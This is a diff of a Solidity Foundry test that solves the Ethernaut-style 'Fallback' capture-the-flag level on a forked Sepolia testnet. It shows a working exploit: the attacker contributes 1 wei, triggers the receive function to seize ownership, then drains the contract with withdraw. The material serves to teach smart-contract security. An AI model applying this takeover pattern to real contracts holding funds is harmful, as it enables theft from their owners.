@@ -1,26 +1,23 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import "forge-std/Script.sol";
+import "forge-std/Test.sol";
 import "forge-std/console.sol";
 import {Fallback} from "../src/Fallback.sol";
 
-contract FallbackSolution is Script {
-    // $ forge script script/Fallback.s.sol:FallbackSolution --rpc-url $SEPOLIA_RPC_URL --account updraft --broadcast -vvvvv
-    // $ forge script script/Fallback.s.sol --tc FallbackSolution
-    Fallback public fallbackInstance;
+contract FallbackSolution is Test {
+    Fallback public fallbackInstance = Fallback(payable(0x813aCfC55db8d05D1F80800F505c1402bbf76A6e)); // Replace with actual deployed address if needed
+    address attacker = makeAddr("attacker");
 
-    function run() external {
-        address deployer = makeAddr("deployer");
-        address attacker = makeAddr("attacker");
-        vm.deal(deployer, 1 ether);
+    function setUp() public {
+        uint256 sepoliaFork = vm.createSelectFork("sepolia");
+        assertEq(vm.activeFork(), sepoliaFork);
         vm.deal(attacker, 1 ether);
-        vm.startPrank(deployer);
-        fallbackInstance = new Fallback();
-
         console.log("Owner:", fallbackInstance.owner());
-        vm.stopPrank();
+    }
+    // forge test --mt testFallbackFork -vvvv
 
+    function testFallbackFork() public {
         // ---- Attack Starts From here ---
 
         // - As you can see in the contract, we need to be the owner of the contract, to crack it.
@@ -33,11 +30,13 @@ contract FallbackSolution is Script {
 
         vm.startPrank(attacker);
         fallbackInstance.contribute{value: 1 wei}(); //send ether when interacting with an ABI
-        (bool success,) = address(payable(fallbackInstance)).call{value: 1 wei}(""); //send ether outside of the ABI
+        (bool success,) = address(fallbackInstance).call{value: 1 wei}(""); //send ether outside of the ABI
         require(success, "Revert sending 1 wei to `fallbackInstance`");
         console.log("New Owner:", fallbackInstance.owner()); // We became the owners
+
         fallbackInstance.withdraw();
-        // console.log("fallbackInstance balance", address(fallbackInstance).balance);
         vm.stopPrank();
+        assertEq(address(fallbackInstance).balance, 0, "Fallback contract should have 0 balance after withdrawal");
+        assertEq(fallbackInstance.owner(), attacker, "Attacker should be the new owner of the Fallback contract");
     }
 }
